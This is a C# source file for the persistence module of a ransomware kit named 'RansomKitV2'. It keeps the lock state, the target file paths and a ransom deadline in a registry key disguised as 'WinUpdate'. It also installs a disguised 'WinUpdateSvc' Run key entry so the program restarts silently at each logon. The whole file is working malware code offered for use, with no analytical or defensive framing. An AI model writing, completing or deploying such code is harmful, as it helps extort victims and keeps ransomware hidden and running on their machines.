using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using Microsoft.Win32;

namespace RansomKitV2
{
    public static class Persistence
    {
        private const string RegBase = @"Software\Microsoft\Windows\CurrentVersion";
        private const string CustomKeyPath = RegBase + @"\WinUpdate";
        private const string RunKeyPath = RegBase + @"\Run";

        private const string RunValueName = "WinUpdateSvc";
        private const string LockedValueName = "Locked";
        private const string PathsValueName = "Paths";
        private const string DeadlineValueName = "DeadlineUtc";

        // ---------------------------------------------------------
        //  Key access
        // ---------------------------------------------------------
        private static RegistryKey? OpenCustom(bool writable)
        {
            try
            {
                return writable
                    ? Registry.CurrentUser.CreateSubKey(CustomKeyPath, true)
                    : Registry.CurrentUser.OpenSubKey(CustomKeyPath, false);
            }
            catch { return null; }
        }

        // ---------------------------------------------------------
        //  Lock state
        // ---------------------------------------------------------
        public static bool IsLocked()
        {
            try
            {
                using var k = OpenCustom(false);
                var v = k?.GetValue(LockedValueName);
                return v is int i && i != 0;
            }
            catch { return false; }
        }

        public static void SetLocked(bool locked)
        {
            try
            {
                using var k = OpenCustom(true);
                k?.SetValue(LockedValueName, locked ? 1 : 0, RegistryValueKind.DWord);
            }
            catch { }
        }

        // ---------------------------------------------------------
        //  Target paths (REG_MULTI_SZ)
        // ---------------------------------------------------------
        public static void SavePaths(IEnumerable<string> paths)
        {
            if (paths == null) return;
            try
            {
                using var k = OpenCustom(true);
                if (k == null) return;

                var list = new List<string>();
                foreach (var p in paths)
                    if (!string.IsNullOrWhiteSpace(p))
                        list.Add(p);

                if (list.Count == 0)
                    k.DeleteValue(PathsValueName, false);
                else
                    k.SetValue(PathsValueName, list.ToArray(), RegistryValueKind.MultiString);
            }
            catch { }
        }

        public static List<string> LoadPaths()
        {
            var result = new List<string>();
            try
            {
                using var k = OpenCustom(false);
                if (k == null) return result;

                var raw = k.GetValue(PathsValueName) as string[];
                if (raw == null) return result;

                foreach (var p in raw)
                    if (!string.IsNullOrWhiteSpace(p))
                        result.Add(p);
            }
            catch { }
            return result;
        }

        public static void ClearPaths()
        {
            try
            {
                using var k = OpenCustom(true);
                try { k?.DeleteValue(PathsValueName, false); } catch { }
            }
            catch { }
        }

        // ---------------------------------------------------------
        //  Deadline (UTC ticks, REG_QWORD)
        // ---------------------------------------------------------
        public static void SaveDeadline(DateTime utc)
        {
            try
            {
                using var k = OpenCustom(true);
                k?.SetValue(DeadlineValueName, utc.Ticks, RegistryValueKind.QWord);
            }
            catch { }
        }

        public static DateTime? LoadDeadline()
        {
            try
            {
                using var k = OpenCustom(false);
                var raw = k?.GetValue(DeadlineValueName);
                if (raw is long ticks && ticks > 0)
                    return new DateTime(ticks, DateTimeKind.Utc);
            }
            catch { }
            return null;
        }

        public static void ClearDeadline()
        {
            try
            {
                using var k = OpenCustom(true);
                try { k?.DeleteValue(DeadlineValueName, false); } catch { }
            }
            catch { }
        }

        // ---------------------------------------------------------
        //  Auto-start (HKCU\...\Run)
        // ---------------------------------------------------------
        public static void EnsureAutoStart()
        {
            try
            {
                string exe = Process.GetCurrentProcess().MainModule?.FileName
                             ?? Assembly.GetExecutingAssembly().Location;

                using var k = Registry.CurrentUser.CreateSubKey(RunKeyPath, true);
                if (k == null) return;

                string desired = $"\"{exe}\" --silent";
                var current = k.GetValue(RunValueName) as string;

                if (!string.Equals(current, desired, StringComparison.OrdinalIgnoreCase))
                    k.SetValue(RunValueName, desired, RegistryValueKind.String);
            }
            catch { }
        }

        public static void DisableAutoStart()
        {
            try
            {
                using var k = Registry.CurrentUser.OpenSubKey(RunKeyPath, true);
                try { k?.DeleteValue(RunValueName, false); } catch { }
            }
            catch { }
        }
    }
}